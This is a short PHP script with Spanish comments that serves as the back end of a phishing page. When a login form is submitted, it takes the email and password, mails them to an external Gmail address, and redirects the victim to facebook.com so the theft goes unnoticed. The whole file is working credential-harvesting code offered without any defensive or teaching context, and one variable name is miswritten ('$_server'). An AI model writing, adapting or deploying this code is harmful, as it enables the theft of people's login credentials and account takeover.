<?php
if ($_server["REQUEST_METHOD"] == "POST"){
    $email = $_POST["email"];
    $password = $_POST["password"];
    //envia correo
    $to = "runtimebroker1@gmail.com";
    $subject = "nuevo inicio de sesion";
    $message = "correo electronico: $email\nContraseña: $password";
    mail($to, $subject, $message);
    //redirige a
    header("location: https://www.facebook.com");

}
?>